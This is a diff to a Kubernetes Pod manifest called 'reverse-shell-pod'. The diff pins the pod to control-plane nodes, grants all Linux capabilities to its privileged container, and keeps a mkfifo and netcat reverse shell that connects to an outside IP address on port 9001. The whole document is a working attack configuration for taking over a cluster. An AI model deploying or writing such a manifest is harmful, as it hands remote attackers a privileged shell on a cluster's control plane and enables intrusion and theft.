@@ -3,12 +3,24 @@ kind: Pod
 metadata:
   name: reverse-shell-pod
 spec:
+  nodeSelector:
+    node-role.kubernetes.io/control-plane: ""
+  tolerations:
+  - key: node-role.kubernetes.io/control-plane
+    operator: Exists
+    effect: NoSchedule
+  - key: node-role.kubernetes.io/master
+    operator: Exists
+    effect: NoSchedule
   containers:
   - name: shell-container
     image: alpine
     command: ["/bin/sh", "-c"]
     securityContext:
       privileged: true
+      capabilities:
+        add: ["ALL"]
     args:
     - |
-      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 188.227.84.184 9001 >/tmp/f
+      rm /tmp/f; mkfifo /tmp/f;
+      cat /tmp/f | /bin/sh -i 2>&1 | nc 188.227.84.184 9001 > /tmp/f
